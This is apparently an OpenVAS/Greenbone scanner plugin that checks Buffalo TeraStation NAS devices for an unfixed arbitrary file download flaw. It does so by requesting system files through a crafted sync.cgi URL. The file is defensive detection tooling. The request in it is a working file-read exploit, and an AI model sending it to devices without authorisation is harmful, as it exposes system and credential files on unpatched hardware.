CPE = "cpe:/h:buffalotech:nas";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103650" );
	script_bugtraq_id( 57634 );
	script_version( "2021-04-16T06:57:08+0000" );
	script_name( "Buffalo TeraStation Multiple Security Vulnerabilities" );
	script_tag( name: "cvss_base", value: "8.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:P/A:N" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2013-01-31 12:41:05 +0100 (Thu, 31 Jan 2013)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "gb_buffalotech_nas_web_detect.sc", "os_detection.sc" );
	script_mandatory_keys( "buffalo/nas/detected" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/57634" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "Buffalo TeraStation is prone to an arbitrary file download and an
  arbitrary command-injection vulnerability because it fails to sufficiently sanitize user-supplied data." );
	script_tag( name: "impact", value: "An attacker can exploit these issues to download arbitrary files and
  execute arbitrary-commands with root privilege within the context of the vulnerable system. Successful
  exploits will result in the complete compromise of affected system." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( port: port, cpe: CPE )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for pattern in keys( files ) {
	file = files[pattern];
	url = dir + "/cgi-bin/sync.cgi?gSSS=foo&gRRR=foo&gPage=information&gMode=log&gType=save&gKey=/" + file;
	if(http_vuln_check( port: port, url: url, pattern: pattern )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

